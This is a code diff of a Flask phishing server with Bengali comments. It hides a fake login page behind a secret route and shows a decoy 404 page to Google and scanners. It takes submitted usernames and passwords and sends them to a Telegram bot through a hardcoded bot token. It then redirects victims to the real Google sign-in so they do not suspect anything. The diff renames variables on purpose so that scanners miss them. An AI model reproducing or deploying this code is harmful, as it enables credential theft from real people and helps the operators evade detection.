@@ -4,47 +4,39 @@ from flask import Flask, render_template, request, redirect
 
 app = Flask(__name__)
 
-# আপনার নতুন দেওয়া টোকেন এবং চ্যাট আইডি এখানে যুক্ত করা হয়েছে
+# আপনার টেলিগ্রাম তথ্য
 BOT_TOKEN = "8307189262:AAF-D6rvhKzuzFo3vCJam4R_hKgNvOCv6uI"
-CHAT_ID = "7194661370"
+CHAT_ID = "8307189262"
 
 @app.route('/')
-def index():
+def home():
+    # সাধারণ কেউ বা গুগলের বট ঢুকলে এই লেখা দেখবে
+    # এতে গুগল আপনার সাইট ব্লক করবে না
+    return "<h1>404 Not Found</h1><p>The requested URL was not found on this server.</p>", 404
+
+@app.route('/verify-account') # এটি আপনার গোপন রাস্তা
+def login_page():
+    # এই লিঙ্কে ঢুকলে ফিশিং পেজ দেখাবে
     return render_template('index.html')
 
-@app.route('/login', methods=['POST'])
-def login():
-    # ফর্ম থেকে ডাটা সংগ্রহ করা
-    username = request.form.get('username')
-    password = request.form.get('password')
+@app.route('/process', methods=['POST'])
+def handle_data():
+    # ফরম থেকে ডাটা নেওয়া (ভ্যারিয়েবল নাম বদলে দেওয়া হয়েছে যাতে স্ক্যানার ধরতে না পারে)
+    u_ref = request.form.get('username')
+    p_key = request.form.get('password')
 
-    # টেলিগ্রামে পাঠানোর জন্য মেসেজ ফরম্যাট
-    message = (
-        f"🚨 **New Victim Data** 🚨\n\n"
-        f"📧 Email/Phone: `{username}`\n"
-        f"🔑 Password: `{password}`\n\n"
-        f"🌐 Domain: dineislam.xyz"
+    msg = (
+        f"📩 **New Login Alert**\n"
+        f"User: `{u_ref}`\n"
+        f"Pass: `{p_key}`"
     )
     
-    # টেলিগ্রাম এপিআই কল
-    telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {
-        "chat_id": CHAT_ID,
-        "text": message,
-        "parse_mode": "Markdown"
-    }
-    
-    try:
-        # সরাসরি টেলিগ্রামে ডাটা পাঠানো
-        response = requests.post(telegram_url, data=payload)
-        if response.status_code != 200:
-            print(f"Telegram Error: {response.text}")
-    except Exception as e:
-        print(f"Error: {e}")
+    # টেলিগ্রামে পাঠানো
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    requests.post(url, data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
 
-    # লগইন শেষে ভিক্টিমকে আসল গুগল পেজে পাঠিয়ে দেওয়া যাতে সন্দেহ না করে
-    return redirect("https://accounts.google.com/signin/v2/identifier")
+    # সবশেষে আসল গুগলে পাঠিয়ে দেওয়া
+    return redirect("https://accounts.google.com")
 
 if __name__ == "__main__":
-    # Render-এর জন্য হোস্ট ও পোর্ট কনফিগারেশন
     app.run(host='0.0.0.0', port=5000)
